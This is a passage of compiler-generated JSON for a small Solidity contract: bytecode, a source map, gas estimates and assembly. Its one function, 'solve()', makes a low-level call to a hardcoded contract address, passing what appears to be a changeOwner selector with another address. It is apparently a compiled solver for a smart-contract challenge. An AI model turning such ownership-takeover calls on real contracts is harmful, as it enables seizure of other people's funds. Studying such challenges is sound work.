0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2E8 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2CD JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x2F7 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x308 DUP3 PUSH2 0x319 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x324 DUP3 PUSH2 0x33C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x60 SHL SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB5 SELFBALANCE SWAP8 0xE9 COINBASE DUP7 0x4C SWAP7 0xC8 0x28 SLT 0x27 SWAP15 0x4D 0xB6 0x25 KECCAK256 CALL DELEGATECALL GASLIMIT ADD 0xEA 0xA6 0xB1 0xED 0xE4 0xE 0xA9 MUL BYTE 0xEF SDIV PUSH5 0x736F6C6343 STOP ADDMOD SMOD STOP CALLER ",
							"sourceMap": "294:523:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;328:486;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;363:12;388:20;419:42;388:74;;474:12;488:19;511:12;:17;;533:9;582:33;640:42;544:150;;;;;;;;;:::i;:::-;;;;;;;;;;;;;511:184;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;473:222;;;;709:7;706:101;;;739:6;732:13;;;;;;;706:101;787:8;;;328:486;;:::o;7:157:1:-;112:45;132:24;150:5;132:24;:::i;:::-;112:45;:::i;:::-;107:3;100:58;7:157;;:::o;170:153::-;273:43;292:23;309:5;292:23;:::i;:::-;273:43;:::i;:::-;268:3;261:56;170:153;;:::o;329:360::-;415:3;443:38;475:5;443:38;:::i;:::-;497:70;560:6;555:3;497:70;:::i;:::-;490:77;;576:52;621:6;616:3;609:4;602:5;598:16;576:52;:::i;:::-;653:29;675:6;653:29;:::i;:::-;648:3;644:39;637:46;;419:270;329:360;;;;:::o;695:373::-;799:3;827:38;859:5;827:38;:::i;:::-;881:88;962:6;957:3;881:88;:::i;:::-;874:95;;978:52;1023:6;1018:3;1011:4;1004:5;1000:16;978:52;:::i;:::-;1055:6;1050:3;1046:16;1039:23;;803:265;695:373;;;;:::o;1074:392::-;1212:3;1227:73;1296:3;1287:6;1227:73;:::i;:::-;1325:1;1320:3;1316:11;1309:18;;1337:75;1408:3;1399:6;1337:75;:::i;:::-;1437:2;1432:3;1428:12;1421:19;;1457:3;1450:10;;1074:392;;;;;:::o;1472:271::-;1602:3;1624:93;1713:3;1704:6;1624:93;:::i;:::-;1617:100;;1734:3;1727:10;;1472:271;;;;:::o;1749:309::-;1860:4;1898:2;1887:9;1883:18;1875:26;;1947:9;1941:4;1937:20;1933:1;1922:9;1918:17;1911:47;1975:76;2046:4;2037:6;1975:76;:::i;:::-;1967:84;;1749:309;;;;:::o;2064:98::-;2115:6;2149:5;2143:12;2133:22;;2064:98;;;:::o;2168:168::-;2251:11;2285:6;2280:3;2273:19;2325:4;2320:3;2316:14;2301:29;;2168:168;;;;:::o;2342:147::-;2443:11;2480:3;2465:18;;2342:147;;;;:::o;2495:96::-;2532:7;2561:24;2579:5;2561:24;:::i;:::-;2550:35;;2495:96;;;:::o;2597:149::-;2633:7;2673:66;2666:5;2662:78;2651:89;;2597:149;;;:::o;2752:126::-;2789:7;2829:42;2822:5;2818:54;2807:65;;2752:126;;;:::o;2884:307::-;2952:1;2962:113;2976:6;2973:1;2970:13;2962:113;;;3061:1;3056:3;3052:11;3046:18;3042:1;3037:3;3033:11;3026:39;2998:2;2995:1;2991:10;2986:15;;2962:113;;;3093:6;3090:1;3087:13;3084:101;;;3173:1;3164:6;3159:3;3155:16;3148:27;3084:101;2933:258;2884:307;;;:::o;3197:100::-;3236:7;3265:26;3285:5;3265:26;:::i;:::-;3254:37;;3197:100;;;:::o;3303:78::-;3341:7;3370:5;3359:16;;3303:78;;;:::o;3387:94::-;3426:7;3455:20;3469:5;3455:20;:::i;:::-;3444:31;;3387:94;;;:::o;3487:102::-;3528:6;3579:2;3575:7;3570:2;3563:5;3559:14;3555:28;3545:38;;3487:102;;;:::o;3595:94::-;3628:8;3676:5;3672:2;3668:14;3647:35;;3595:94;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "179000",
								"executionCost": "220",
								"totalCost": "179220"
							},
							"external": {
								"solve()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 294,
									"end": 817,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 294,
									"end": 817,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 294,
									"end": 817,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220b54797e941864c96c82812279e4db62520f1f44501eaa6b1ede40ea9021aef0564736f6c63430008070033",
									".code": [
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH",
											"source": 0,
											"value": "890D6908"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 294,
											"end": 817,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 294,
											"end": 817,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 363,
											"end": 375,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 388,
											"end": 408,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 419,
											"end": 461,
											"name": "PUSH",
											"source": 0,
											"value": "3CBED7039BDA6AE4523C6E7BB6579718A584F83"
										},
										{
											"begin": 388,
											"end": 462,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 388,
											"end": 462,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 474,
											"end": 486,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 488,
											"end": 507,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 511,
											"end": 523,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 511,
											"end": 528,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 511,
											"end": 528,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 533,
											"end": 542,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 582,
											"end": 615,
											"name": "PUSH",
											"source": 0,
											"value": "A6F9DAE13F6F9F7DE69814715796059E291F78E951670D244DD3B07111B8BB18"
										},
										{
											"begin": 640,
											"end": 682,
											"name": "PUSH",
											"source": 0,
											"value": "798349E06C67272465123B91BD88C5D19B8C7878"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 544,
											"end": 694,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 544,
											"end": 694,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 511,
											"end": 695,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 511,
											"end": 695,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 473,
											"end": 695,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 473,
											"end": 695,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 473,
											"end": 695,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 473,
											"end": 695,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 709,
											"end": 716,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 706,
											"end": 807,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 706,
											"end": 807,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 706,
											"end": 807,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 739,
											"end": 745,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 732,
											"end": 745,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 732,
											"end": 745,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 732,
											"end": 745,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 732,
											"end": 745,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 732,
											"end": 745,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 732,
											"end": 745,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 732,
											"end": 745,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 706,
											"end": 807,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 706,
											"end": 807,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 787,
											"end": 795,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 787,
											"end": 795,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 787,
											"end": 795,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 328,
											"end": 814,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 328,
											"end": 814,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 164,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 7,
											"end": 164,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 112,
											"end": 157,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 132,
											"end": 156,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 150,
											"end": 155,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 132,
											"end": 156,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 132,
											"end": 156,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 132,
											"end": 156,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 132,
											"end": 156,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 112,
											"end": 157,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 112,
											"end": 157,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 112,
											"end": 157,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 112,
											"end": 157,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 107,
											"end": 110,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 100,
											"end": 158,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 7,
											"end": 164,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 164,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 164,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 170,
											"end": 323,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 170,
											"end": 323,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 273,
											"end": 316,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 292,
											"end": 315,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 309,
											"end": 314,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 292,
											"end": 315,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 292,
											"end": 315,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 292,
											"end": 315,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 292,
											"end": 315,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 273,
											"end": 316,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 273,
											"end": 316,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 273,
											"end": 316,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 273,
											"end": 316,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 268,
											"end": 271,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 261,
											"end": 317,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 170,
											"end": 323,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 170,
											"end": 323,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 170,
											"end": 323,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 329,
											"end": 689,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 329,
											"end": 689,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 415,
											"end": 418,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 443,
											"end": 481,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 475,
											"end": 480,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 443,
											"end": 481,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 443,
											"end": 481,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 443,
											"end": 481,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 443,
											"end": 481,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 497,
											"end": 567,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 560,
											"end": 566,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 555,
											"end": 558,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 497,
											"end": 567,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 497,
											"end": 567,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 497,
											"end": 567,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 497,
											"end": 567,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 490,
											"end": 567,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 490,
											"end": 567,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 576,
											"end": 628,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 621,
											"end": 627,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 616,
											"end": 619,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 609,
											"end": 613,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 602,
											"end": 607,
